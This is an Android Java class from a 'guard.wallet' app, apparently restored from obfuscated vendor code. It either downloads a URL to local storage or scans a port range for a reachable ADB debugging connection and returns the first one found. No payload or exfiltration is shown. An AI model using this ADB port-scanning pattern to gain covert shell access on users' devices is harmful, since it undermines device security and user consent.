package com.guard.wallet.download;

import com.guard.wallet.adb.AdbConnectionManager;
import com.guard.wallet.core.AppUtils;
import android.util.Log;
import com.guard.wallet.utils.SystemHelper;
import java.util.concurrent.Callable;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 多模式 Callable 任务（下载/扫描/ADB）。
 * mode=0: 分片下载（DownloadManager.a）
 * mode=1: 简单下载（DownloadManager.b）
 * mode>=2: ADB 端口扫描
 *
 * vendor 原始路径: p/a.java
 */
public final class MultiModeTask implements Callable {
    public final int a;
    public final Object b;
    public Object c;

    public MultiModeTask(int mode, Object param1, Object param2) {
        this.a = mode;
        this.b = param1;
        this.c = param2;
    }

    public final String a() {
        int var1 = this.a;
        String var2 = (String) this.b;
        switch (var1) {
            case 0: {
                String url = var2;
                String result = null;
                if (!AppUtils.B(url)) {
                    if (AppUtils.B((String) this.c)) { this.c = AppUtils.x(url); }
                    if (AppUtils.B((String) this.c)) { this.c = "unknown"; }
                    String path = SystemHelper.i0().concat("/").concat((String) this.c);
                    Log.d("DownLoadCallable", path);
                    if (DownloadManager.a(url, path)) { result = path; }
                }
                return result;
            }
            default: {
                String url = var2;
                String result = null;
                if (!AppUtils.B(url)) {
                    if (AppUtils.B((String) this.c)) { this.c = AppUtils.x(url); }
                    if (AppUtils.B((String) this.c)) { this.c = "unknown"; }
                    String path = SystemHelper.i0().concat("/").concat((String) this.c);
                    Log.d("DownLoadCallable", path);
                    if (DownloadManager.b(url, path)) { result = path; }
                }
                return result;
            }
        }
    }

    @Override
    public final Object call() {
        switch (this.a) {
            case 0:
            case 1:
                return this.a();
            default: {
                // vendor: port scan via AdbConnectionManager
                int endPort = (Integer) this.c;
                Integer startPort = (Integer) this.b;
                if (endPort >= startPort) {
                    AdbConnectionManager adbMgr = AdbConnectionManager.getInstance();
                    if (adbMgr != null) {
                        AtomicInteger counter = new AtomicInteger(startPort);
                        while (true) {
                            int port = counter.getAndIncrement();
                            if (port > endPort || adbMgr.adbVerified.get()) break;
                            if (!AppUtils.E(port)) {
                                com.guard.wallet.entity.CheckPortResult result = adbMgr.connectToPort(port);
                                if (result != null && result.isConnected()) { return result; }
                            }
                        }
                    }
                }
                return null;
            }
        }
    }
}
